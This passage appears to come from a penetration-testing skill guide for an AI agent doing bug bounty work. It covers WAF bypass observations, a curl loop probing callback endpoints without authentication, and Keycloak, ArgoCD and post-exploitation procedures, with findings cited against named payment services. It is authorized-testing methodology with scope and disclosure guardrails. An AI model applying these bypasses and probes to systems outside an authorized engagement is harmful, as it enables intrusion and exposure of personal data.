- The WAF blocks at URL pattern level before reaching the application

**What works:**
- Endpoints not covered by WAF rules still pass through (e.g., `/actuator/metrics` but not `/actuator/prometheus`)
- Callback/integration paths often bypass WAF rules (designed for partner access)

### Tencent Cloud WAF (T-Sec-WAF) Behavior Patterns

When testing targets behind Tencent Cloud WAF:

| Behavior | Indicator |
|----------|-----------|
| WAF block | 403 + `T-Sec-WAF: StdPortNoMatchServer` header (no Host match) |
| WAF block (rule) | 403 + HTML page with "Your request has been interrupted" + UUID |
| Kong behind WAF | 404 + `{"message":"no Route matched with those values"}` + `X-Kong-*` headers |
| Kong auth | 401 + `WWW-Authenticate: Bearer realm=gojek` |

**WAF rules observed (GoBiz, May 2026):**
- Blocks dotfile access (`.git`, `.env`, `.gitignore`) — returns 403
- Blocks `/api/*` prefix with common attack paths — returns 403
- Blocks path traversal with `..;` and `%2f` — returns 403
- Blocks SQLi patterns in URL path — returns 403
- Does NOT block: standard `../` (Kong normalizes), double-encoding `%252f` (Kong routes)

**WAF rules observed (GoFood, May 2026):**
- Blocks `/actuator/env`, `/.env`, `/.git/HEAD` — returns 403 (2810 bytes WAF block page)
- Blocks `/goid/login/request` on prod — returns 403
- Does NOT block `/goid/token` on prod — returns real API errors (400/401)
- Non-prod environments (alpha, q, integration) have RELAXED WAF — GoID endpoints accessible
- WAF block page: `server: stgw`, `eo-log-uuid` header, references `api.waf-intl.qq.com`

**Tencent EdgeOne status codes:**
- 418: "No Host match" — vhost not configured for that IP (TencentEdgeOne server header)
- 403 + WAF block page: Rule-based block (stgw server header, eo-log-uuid header)

**WAF bypass attempts that FAILED:**
HTTP/1.0 downgrade, case variation (.Git/.GIT), URL encoding (%2e%67%69%74), zero-width space, backslash, overlong UTF-8, X-Original-URL header, null byte, trailing space/newline

**WAF bypass that reached Express.js (but file not found):**
Tab in path (`%09`), semicolon path param (`;x=1`), fragment encode (`%23`) — these bypass the WAF dotfile rule but Express.js doesn't normalize them to the actual file path.

**Key insight:** Tencent WAF checks the raw URL before decoding. If you can find a character that WAF ignores but the backend normalizes, you bypass. For Express.js specifically, no working bypass was found (Express serves files by exact decoded path).

### Alibaba Cloud Infrastructure Patterns

**Full reference:** See `references/alibaba-cloud-infrastructure.md` for:
- Detection signals (Tengine WAF, `acw_tc` cookie, NLB hostnames, IP ranges)
- WAF vs Istio RBAC differentiation
- Kubernetes cluster naming convention (`al-mg-id-p`/`al-mg-id-s`)
- Actuator metrics as API route discovery (extracting all routes from `http.server.requests` tags)
- Integration/callback endpoint pattern (server-to-server endpoints lacking auth — HIGH VALUE)
- Port exposure pattern (TCP open but app-layer filtered)

### Unauthenticated Callback/Webhook Endpoint Testing (MANDATORY Phase 3/6)

**When you discover `/integration/*`, `/callback/*`, `/webhook/*`, `/hook/*`, or `*/callback` paths (from actuator metrics, JS bundles, or path brute-force), ALWAYS test them without authentication.** These endpoints are designed to receive calls from partner services and often skip auth entirely.

**Why callbacks are high-priority:**
- They're meant to be called by external services (GoPay, payment gateways, KYC providers)
- Developers often rely on "security through obscurity" (hard-to-guess URLs) instead of proper auth
- They frequently return or accept sensitive data (KYC documents, payment status, account approvals)
- Error messages on callbacks often disclose internal service names and routing

**Discovery techniques:**
1. Actuator `/metrics` → check `uri` tags for `/integration/*`, `*/callback` patterns
2. JS bundle analysis → search for "callback", "webhook", "integration" in source
3. Path brute-force with callback-specific wordlist
4. Error-based discovery: POST to guessed paths, check for 500 (processed) vs 404 (doesn't exist)

**Testing procedure:**
```bash
# For each discovered callback/integration path:
for method in GET POST PUT; do
  curl -sk -X $method "$URL" -H "Content-Type: application/json" -d '{}' -w " [%{http_code}]"
done
```

**Interpretation:**
- 400 (bad request) → endpoint processes requests without auth, needs correct payload
- 500 (internal error) → endpoint processes requests without auth, backend issue (check error message for info disclosure)
- 200 with data → **CRITICAL: unauthenticated data access**
- 401/403 → auth enforced (safe)
- 404 → path doesn't exist
- 405 → method not allowed but path exists (try other methods)

**Real-world example (Findaya, May 2026):**
```
POST /legalEntityKYC/v1/onboarding-doc → 200 with 9 signed GCS URLs to production KYC documents
POST /integration/gopay/kyc/v1/test/callback → 500 disclosing internal service name "kyc-service"
POST /v1/user/progressive-kyc/callback → 500 (processed without auth)
```
Result: Critical finding — unauthenticated access to production KYC documents (KTP, NPWP, akta pendirian) of legal entities.

**Checklist (add to Phase 3 enumeration + Phase 6 exploitation):**
- [ ] Identify all callback/integration/webhook paths (from actuator, JS, brute-force)
- [ ] Test each with POST + empty JSON body (no auth headers)
- [ ] If 400: analyze error message for required fields, construct minimal valid payload
- [ ] If 500: document error message (often discloses internal services)
- [ ] If 200 with data: **ESCALATE** — document as Critical if PII/financial data

### Exposed Kubernetes Management Tooling (ArgoCD, Grafana, Prometheus)

**Full reference:** See `references/kubernetes-management-tooling.md` for:
- Detection signals (subdomain patterns, response indicators)
- ArgoCD assessment (unauthenticated endpoints, settings analysis, CVE mapping)
- Grafana/Prometheus/Harbor/Vault assessment procedures
- Device code flow exploitation (cross-ref: `references/oauth-sso-attack-chains.md`)
- Severity guidance and reporting framing

**Key insight:** When Istio RBAC blocks all API services, look for management tooling that sits OUTSIDE the mesh or has different auth (ArgoCD with Dex, Grafana with local auth, Prometheus with no auth). These are often the only exploitable entry points on heavily-hardened cloud-native targets.

**Minimum checklist (add to Phase 1/2 when cloud-native infra detected):**
- [ ] Check for ArgoCD subdomains (argocd*, argo-cd*, gitops*, argocd-ui*, argocd-grpc*)
- [ ] Check for paired instances (argocd-ui + argocd-ui-stg on separate IPs — common GoTo/enterprise pattern)
- [ ] Check for Grafana/Prometheus/Jaeger subdomains
- [ ] If found: test unauthenticated endpoints (/api/version, /api/v1/settings, /healthz)
- [ ] If Dex/OIDC present: test device code flow (`POST /api/dex/device/code` with `client_id=argo-cd`)
- [ ] Document version + exposed configuration even if auth blocks further access
- [ ] Report PRODUCTION instance (staging may be excluded by program rules)

### Exploiting Exposed Keycloak via Gateway

**Full reference:** See `references/keycloak-gateway-exploitation.md` and `references/keycloak-assessment.md` for:
- Gateway path discovery (/keycloak/, /auth/, /sso/)
- Realm enumeration and public client identification
- Username enumeration and password spray (with authorization)
- Token analysis and service account escalation

### Production Microservice Exploitation (with valid JWT)

**Full reference:** See `references/authenticated-testing-playbook.md` for:
- Systematic service enumeration with valid token
- Actuator/swagger access with auth (reveals more than unauth)
- Cross-service token validation testing
- Data exfiltration scope documentation

### Snyk Data as Attack Intelligence

**Full reference:** See `references/snyk-token-enumeration.md` for:
- Extracting exploitable CVEs from Snyk data
- Mapping CVEs to discovered microservices
- Prioritization by reachability and exploit availability

## Phase 7: Post-Exploitation — Structured Framework

**Full framework:** See `references/phase7-post-exploitation-framework.md` for:
- Access classification (Shell / API / Data / None / Mixed)
- Three distinct playbooks based on access type
- Mandatory checklist with scope-aware technique matrix (10 techniques)
- Exit criteria for gateway transition
- Time management and priority allocation

### No Shell Scenarios

When exploitation achieves data access but NOT remote code execution (common in API-focused engagements), Phase 7 should focus on:

### What to Document

1. **Data access scope** — what was actually exfiltrated, volume, sensitivity classification
2. **Lateral movement paths** — theoretical paths if access were escalated
3. **Credential sources** — where credentials WOULD be found (actuator/env, K8s secrets, .env files)
4. **Attack path diagram** — visual showing confirmed vs theoretical paths
5. **Impact amplification** — how combining findings creates worse outcomes than individual findings

### Phase 7 Checklist (No Shell)

| Technique | Status |
|-----------|--------|
| Document all data accessed (with record counts) | PENDING |
| Classify data sensitivity (PII, business logic, credentials) | PENDING |
| Data classification analysis (see `references/data-classification-framework.md`) | PENDING |
| Map theoretical lateral movement paths | PENDING |
| Identify credential sources (if access escalated) | PENDING |
| Create attack path diagram (confirmed + theoretical) | PENDING |
| Assess combined finding impact (attack chains) | PENDING |
| Document what was NOT accessed (scope of damage) | PENDING |
| Tag all findings with environment (prod/nonprod/experiment) | PENDING |

### Key Principle

Even without a shell, document the BUSINESS IMPACT of what was achieved. A 900KB data dump of credit scoring rules may be more damaging than a low-privilege shell on a dev server.

---

## Istio/Service Mesh Assessment (External)

When Istio is detected (via Kiali subdomains, `x-envoy-upstream-service-time` headers), document:

### Confirmation Indicators

| Indicator | Source |
|-----------|--------|
| `x-envoy-upstream-service-time` header | Any HTTP response |
| `kiali*.domain` subdomains | DNS enumeration |
| `kiali-private*.domain` (internal IP) | DNS — confirms internal-only dashboard |
| Consistent CORS headers across services | Mesh-level CORS policy |
| `x-datadog-*` / `Traceparent` in allowed headers | Distributed tracing integration |

### What You CAN Assess Externally

- Envoy sidecar presence (confirmed by header)
- Whether auth is mesh-level vs app-level (if one service lacks auth, it's app-level)
- Tracing/APM stack (from CORS allowed headers)
- Whether Kiali is externally accessible (try ports 20001, 8080, 8443, 3000)

### What You CANNOT Assess Externally

- mTLS enforcement between pods
- AuthorizationPolicy coverage
- VirtualService/DestinationRule configs
- Service-to-service communication graph
- Namespace isolation

### Security Implications to Report

If auth is app-level (not mesh-level), document that:
- A single misconfigured service = full data exposure (as demonstrated)
- Istio AuthorizationPolicy SHOULD enforce JWT at namespace level
- Recommendation: `RequestAuthentication` + `AuthorizationPolicy` requiring valid JWT for all inbound traffic

---

## Guardrails

- **Public Disclosure Prohibition** — NEVER publish PoCs, exploit code, or vulnerability details on public URLs (GitHub Pages, personal blogs, Codepen, JSFiddle, public repos) before the vendor acknowledges AND fixes the vulnerability (or 90-day disclosure deadline passes). PoC code belongs in the report body or as a private attachment on the platform. If a hosted PoC is needed for demonstration (e.g., CORS chain), embed the HTML directly in the submission. If you accidentally publish, immediately remove it (git force-push to remove from history), check caches (Google, Wayback Machine), and disclose the brief exposure in your report. Violation = no bounty + potential platform ban. **Real incident (GoPay, May 2026):** PoC pushed to GitHub Pages had to be reverted via `git reset --hard` + force-push. The page was live briefly but returned 404 by the time we checked. Always keep PoCs local in `ptest-output/report/`. See `references/bug-bounty-submission-guide.md` for full policy.
- **YesWeHack Dojo Challenges** — See `references/yeswehack-dojo-interaction.md` for UI interaction patterns (login requirement, tab structure, programmatic DOM access). Dojo challenges require YWH OAuth login to submit inputs.
- **Bug Bounty Scope Interpretation** — Pay close attention to scope TYPE on bug bounty platforms. A target listed as "Web application" (e.g., `mokapos.com`) means ONLY that specific domain/app, NOT `*.mokapos.com` wildcard. Only targets explicitly listed as "Wildcard" (e.g., `*.gopayapi.com`) include subdomains. When in doubt, ask the operator before spending time on subdomain recon. Per most programs: "valid report submissions that are outside of the in-scope assets... won't probably go higher than a Tier 2 Medium bounty." Confirm scope interpretation BEFORE Phase 1 subdomain enumeration to avoid wasted effort.
- **Account Creation Blockers (Bug Bounty)** — some targets require identity verification (KYC, PAN card, national ID) or region-specific phone numbers for account creation. Browser automation is often blocked by Cloudflare/reCAPTCHA. When unauthenticated testing is exhausted and account creation is blocked: (1) document the limitation clearly, (2) offer the user options (manual signup, Google OAuth, API-based registration if available), (3) if user creates account manually, request the auth token from DevTools (Authorization header or cookie). Never attempt to bypass KYC or create fraudulent accounts.
- **Hardened Target Fast-Exit** — if the first 3 vectors on a target all fail cleanly (proper error handling, no info leak, auth enforced, no default creds), mark it as "hardened" in the checklist and move on. Maximum 15-20 minutes per hardened target. Document what was tested and why it's considered hardened. **Exception:** Always check pre-auth flows (OTP, login, registration, password reset) even on hardened targets — these are outside the auth boundary and often have different security controls than the main API.
- **Zero-Finding Close-Out Path** — if Phase 5 concludes with 0 confirmed exploitable vectors AND all priority targets from the attack surface matrix are either (a) hardened with proper auth, (b) blocked by WAF with no bypass found, or (c) excluded by program rules, then fast-track Phases 6-8: mark Phase 6 as "PASSED (no exploitable vectors)", Phase 7 as "PASSED (N/A — no access achieved)", and proceed directly to a close-out report documenting the security posture assessment. Do NOT spend time "exploiting" vectors that don't exist. The close-out report should document: what was tested, why it's hardened, what would be needed for deeper testing (e.g., authenticated access, mobile app account).
- **Program Exclusion Cross-Check (Phase 4, MANDATORY)** — during attack surface mapping, cross-reference ALL discovered vectors against the bug bounty program's exclusion list BEFORE scoring them. Vectors that match program exclusions (e.g., rate limiting, user enumeration, staging environments, public API keys) should be marked as "EXCLUDED (program rule)" in the priority matrix with score 0. This prevents wasting Phase 5-6 time on vectors that can't be reported. Document exclusions in the attack surface checklist. If ALL high-priority vectors are excluded, this is an early signal that the engagement may close with 0 findings.
- **Captcha-Gated Target Assessment (Phase 5)** — when reCAPTCHA/hCaptcha/Turnstile protects all pre-auth flows, assess within 10 minutes: (1) Is captcha server-validated or client-only? (check if removing the token from the request changes the error), (2) Are there endpoints that bypass captcha? (OTP retry, token refresh, registration steps after initial captcha), (3) Is captcha enforced on non-prod environments? If server-validated on all environments with no bypass path, document as "authentication blocker" and factor into close-out decision. Do NOT spend 20+ minutes trying header combinations when the server-side proxy is adding a captcha-derived session token you can't replicate.
- **RBAC Mesh Fast-Exit** — when a target domain has 50+ subdomains ALL returning identical 403 responses with the same body/headers (e.g., Istio RBAC `RBAC: access denied`), this indicates mesh-level authorization policy blocking ALL external traffic. After confirming the pattern on 10-15 representative hosts (mix of service names), mark the entire domain as "mesh-blocked" and move on. Do NOT enumerate all 500 subdomains individually. Document: (1) sample of hosts tested, (2) consistent 403 response body, (3) mesh technology identified (Istio/Envoy/Linkerd), (4) conclusion that external testing is exhausted without valid mesh credentials. Time cap: 30 minutes total for the domain. The only vectors worth trying on mesh-blocked targets are: WAF/ingress bypass techniques (path normalization, header injection), looking for non-mesh endpoints (health checks, metrics ports), and checking if any subdomain resolves to a DIFFERENT IP (not behind the mesh).

- **SPA Catch-All Detection** — before reporting actuator/admin/swagger findings on React/Next.js/Vue apps, verify the response size differs from a random nonexistent path. SPAs serve the same index.html for ALL routes (200 status). Compare `curl -sk -o /dev/null -w "%{size_download}" "$URL/actuator"` vs `curl -sk -o /dev/null -w "%{size_download}" "$URL/nonexistent12345xyz"`. If sizes match → false positive (SPA catch-all). Also check 301/302 responses — Kong/CDN catch-all redirects produce the same pattern.
- **Environment Tagging** — every finding MUST be tagged with the environment: `prod`, `nonprod`, `experiment`, or `all`. Findings on nonprod/experiment instances should note "may not apply to production" unless the same configuration is confirmed on prod. This prevents over-reporting experiment-only issues as production risks.
- **False Positive Verification** — before logging a finding, verify it's not a false positive. Check for SPA catch-alls (same bytes for any path), CORS crashes masking endpoints (all 500s with same error), and 302-to-login (auth required, not bypassed). See `references/false-positive-detection.md`. **Bulk actuator scan pitfall:** When scanning hosts behind Kong/Nginx that serve React SPAs, ALL paths return 200 with identical body size. Also watch for Kong catch-all redirects (301 to login page) and CDN redirects (302 to parent domain). Always baseline with a random nonexistent path FIRST, then filter results by size/redirect-target before investigating.
- **Strict Sequence** — never skip a phase. No exploitation before enumeration and vuln assessment are complete. Even for bug bounties where "fast-tracking to exploitation" seems tempting, the framework exists to prevent blind spots. Never suggest skipping phases to the operator.
- **Self-Audit Before Advancing** — before requesting gateway sign-off, proactively review what was missed in the current phase. List gaps honestly (e.g., "we didn't decompile the APK", "we didn't scrape the API docs"). Offer to fill gaps before moving forward. The operator expects thoroughness over speed. Never suggest skipping phases even for bug bounties or "efficiency" — the framework exists to prevent blind spots. Each phase builds on the previous one; shortcuts create gaps that cost more time later.
- **Phase 1 OSINT Completeness** — before declaring Phase 1 complete, verify ALL of these were attempted: (1) WHOIS/DNS/TXT, (2) subdomain enum (multi-source), (3) Wayback Machine, (4) GitHub/GitLab code search, (5) Google dorking, (6) Shodan/Censys on discovered IPs, (7) JS bundle analysis from accessible apps, (8) Mobile app identification (package names, APK endpoints), (9) Docker Hub/container registry check, (10) dark web & breach data OSINT (see `references/dark-web-breach-osint.md` for full methodology: HIBP, DeHashed, IntelX, Ahmia, ransomware leak sites, DeepDarkCTI). Missing any of these is a gap that should be filled before advancing. Never SUGGEST skipping phases either — even for bug bounties where "time to bounty" feels urgent. The user has explicitly stated: "never skip the phase. because it's a fundamental thing." Each phase builds on the previous; shortcuts produce blind spots.
- **Scope Enforcement** — never test targets outside defined scope. Re-read `scope.md` before each technique.

### Source Code Review Integration (scode skill)

When source code becomes available during an engagement (via source maps, git exposure, debug endpoints, CTF challenge, or client-provided code), invoke the `scode` skill for structured review. This can happen at any phase:

**Trigger conditions:**
- Phase 1: Source map (`.js.map`) discovered → extract and review
- Phase 3: Git repository exposed (`.git/`) → clone and review
- Phase 3: Debug endpoint leaks source (stack traces, Laravel debug, Spring actuator)
- Phase 5: Client provides source for white-box assessment
- Phase 6: Decompiled mobile app code (from `mtest` skill)
- Any phase: CTF/Dojo challenge with source code provided

**Integration workflow:**
1. **Trigger:** Source code obtained → note in current phase checklist
2. **Invoke:** Load `scode` skill, run steps 1-5 (inventory → threat model → trace → findings → report)
3. **Feed back:** Any findings from code review feed into the ptest findings-log with source: "code review"
4. **Priority:** Code review findings that reveal exploitable endpoints get fast-tracked to Phase 6 exploitation
5. **Document:** Add `source-code-review.md` to the current phase's output directory

**What scode adds that ptest alone misses:**
- Logic flaws not detectable via black-box (auth bypass in middleware ordering)
- Hardcoded secrets in non-deployed code paths
- Unsafe deserialization in internal APIs
- Race conditions in transaction handling
- Crypto misuse (weak PRNG, ECB mode, static IV)

**Key rule:** Code review does NOT replace black-box testing. A function that looks secure in source may be exploitable due to deployment configuration, library version differences, or environment-specific behavior. Always verify code review findings with actual exploitation.
- **Bug Bounty Related-Domain Scope Risk** — when you discover findings on domains that are clearly the same company/product but use a DIFFERENT root domain than what's listed in scope (e.g., `go-pay.co.id` vs scoped `gopay.co.id`), treat these as borderline. Strategy: (1) submit clear-scope findings first to establish credibility, (2) submit borderline-scope findings LAST with a "Scope note" explaining why the asset relates to in-scope targets, (3) frame impact in terms of how it affects the explicitly-scoped assets (e.g., "ArgoCD manages the K8s cluster serving *.gopayapi.com"). Worst case: reduced bounty tier. Best case: accepted at full severity because the triager recognizes it's the same infrastructure.
- **Bug Bounty Scope Type Interpretation** — when a program lists an asset as "Web application" (e.g., `mokapos.com`) vs "Wildcard" (e.g., `*.gopayapi.com`), treat them differently. A "Web application" scope means ONLY that specific domain (and www), NOT all subdomains. Subdomains may be accepted at program discretion but at reduced bounty. Always check the scope type column before starting subdomain enumeration. If the operator wants to test broadly anyway, document the risk of rejection in scope.md.
- **Evidence Required** — every finding must have reproducible proof.
- **Verified Findings Only** — a finding must be backed by direct evidence of exploitability or exposure. DNS resolution or CT log presence alone does NOT constitute a finding. Every finding must include proof that the issue is currently exploitable or observable (e.g., HTTP response showing an unauthenticated panel, not just a DNS record pointing to it). Unverified potential issues belong in a "Potential Issues" list for the next phase to validate — not in the findings log.
- **Mandatory Tool Execution** — mandatory tools listed per phase must be run. If unavailable, document the gap explicitly. Never substitute manual probing for an available automated scanner.
- **Human Sign-off** — always request user confirmation before passing a gateway.
- **No Time/Schedule Commentary** — never comment on the time, suggest stopping, or recommend "coming back later." The operator decides their own schedule. Focus on the work.
- **Authorization First** — refuse to begin without confirmed authorization.
- **No Deployed Persistence** — document persistence techniques but do not deploy backdoors without explicit authorization.
- **CTI-Sourced Credentials** — credentials found via Cyber Threat Intelligence (breach databases, dark web) require EXPLICIT authorization to test against production systems. The finding is provable without authentication: (1) credential exists in breach DB, (2) auth endpoint is internet-accessible, (3) no MFA enforced, (4) no credential rotation caught it. Document the risk without logging in. If the client explicitly authorizes credential stuffing against prod, require real-time observation by the client's security team. Never test CTI credentials without confirming scope covers this technique — it may violate local law (e.g., UU ITE in Indonesia) even with a general pentest authorization.
- **Scope Type Awareness** — skip techniques that don't apply to the engagement's scope type.

---

## Execution Pitfalls (Hermes Agent)

> **Full reference:** See `references/operational-pitfalls.md` for all execution pitfalls including parallel probing, terminal backgrounding, tool-specific workarounds, and target-specific lessons learned from BFI Finance and Bank Jago engagements.
